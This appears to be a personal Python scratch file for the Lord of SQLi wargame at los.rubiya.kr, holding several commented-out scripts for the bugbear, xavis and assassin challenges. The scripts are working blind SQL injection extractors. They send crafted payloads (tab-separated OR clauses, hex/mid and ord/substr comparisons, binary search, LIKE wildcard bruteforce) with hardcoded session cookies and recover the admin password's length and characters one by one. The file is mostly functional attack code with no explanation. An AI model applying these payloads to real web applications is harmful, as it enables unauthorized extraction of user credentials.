# import requests
 
# URL='https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php'
# header = {'Content-Type': 'application/json; charset=utf-8'}
# cookie = {'PHPSESSID': 'sp18lp5lai4pmpv6cm8qbdb1mj'}
# password = ''
# length = 0;
 
# for i in range(100):
#     URL_QUERYED=URL+"?no=1%09||%09id%09in%09(\"admin\")%09%26%26%09length(pw)%09in%09("+str(i)+")"
#     print(URL_QUERYED)
#     res=requests.get(URL_QUERYED, headers=header, cookies=cookie)
#     if('Hello admin' in res.text):
#         print(i)
#         length=i
#         break;    
 
# for i in range(length):
#     for j in range(ord('0'),ord('z')+1):
#         #query={'pw': '\' || substring(pw,'+str(i+1)+',1) like \'' + chr(j)+ '\'#'}
#         URL_QUERYED=URL+"?no=1%09||%09id%09in%09(\"admin\")%09%26%26%09hex(mid(pw,"+str(i+1)+",1))%09in%09(hex("+str(j)+"))"        
#         print(URL_QUERYED)
#         res=requests.get(URL_QUERYED, headers=header, cookies=cookie)
#         if('Hello admin' in res.text):
#             password = password + chr(j)
#             print(password)
#             break;
    

    
    

    
    
    
    
    
    

    
    
    

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
# #!/usr/bin/python

# import requests

# cookies = {'PHPSESSID':'3bmebvbakb6dt0qg7g6j8tcd0e'}
# url = 'https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php'

# def getPwLength():
# 	global length
# 	length = 1
# 	while True:
# 		data = "?pw=' or length(pw)=" + str(length) + "%23"
# 		r = requests.get(url + data, cookies = cookies)
# 		if r.text.find('Hello admin') != -1:
# 			print ("[*] Success Get Length : ", length)
# 			break
# 		length += 1

# def SearchPwValue(start, end, idx):
# 	pivot = int((start + end)/2)
# 	if end < start:
# 		print ("[*] Find Value => [Ord] %5d, [Hex]" % pivot, hex(pivot))
# 		return pivot

# 	data = "?pw=' or ord(substr(pw," + str(idx) + ",1))<" + str(pivot) + "%23"
# 	r = requests.get(url + data, cookies = cookies)
# 	if r.text.find("Hello admin") != -1: SearchPwValue(start, pivot - 1, idx)
# 	else: SearchPwValue(pivot + 1, end, idx)

# def getPwValue():
# 	for i in range(1, length + 1):
# 		SearchPwValue(0, 100000, i)
# 	print ("[*] Success Get Admin Password")
	
# getPwLength()
# getPwValue()
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
 




#like bruteforcing
"""
import requests

headers = {'Cookie': 'PHPSESSID=sp18lp5lai4pmpv6cm8qbdb1mj;'}
url = 'https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php'
string = '1234567890abcdefghijklmnopqrstuvwxyz'

pw = ''
tmp_pw = ''
get_len = '_'

while True:
	data = '?pw=' + get_len
	r = requests.get(url + data, headers = headers)
	if r.text.find('Hello admin') != -1:
		length = get_len.count('_')
		break
	elif r.text.find('Hello guest') != -1: length = get_len.count('_')
	
	get_len += '_'
	if get_len.count('_') == 100: break
print ("[+] Get Password Length : " + str(length))

for i in range(1, length + 1):
	for j in string:
		data = '?pw=' + pw + j + '%'
		r = requests.get(url + data, headers = headers)
		if r.text.find('Hello admin') != -1:
			pw += j
			print ("[*] Hello admin ... " + str(pw))
			break
		elif r.text.find('Hello guest') != -1:
			tmp_pw = j
		if j == 'z':
			pw += tmp_pw
			print ("[*] Hello guest ... " + str(pw))
	
print ("[+] Found Password : " + str(pw))
"""    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
#params base URL

"""
for i in range(100):
    query={'pw' : '\' || length(pw) like '+str(i)+' # '}
    res=requests.get(URL, params=query, headers=headers, cookies=cookies)
    if('Hello admin' in res.text):
        print(i)
        length=i
        break;
    
 
for i in range(length):
    for j in range(ord('0'),ord('z')+1):
        query={'pw': '\' || substring(pw,'+str(i+1)+',1) like \'' + chr(j)+ '\'#'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if('Hello admin' in res.text):
            password = password + chr(j)
            print(password)
            break;            
"""